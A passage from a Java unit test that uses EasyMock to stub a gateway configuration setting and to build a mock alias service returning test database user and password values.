    EasyMock.expect(gatewayConfig.getDatabaseConnectionPoolMaxLifetime()).andReturn(60000L).anyTimes();
  }

  private AliasService createAliasService(String user, String password) throws AliasServiceException {
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn(user.toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn(password.toCharArray()).anyTimes();
    EasyMock.replay(aliasService);
    return aliasService;
  }
}
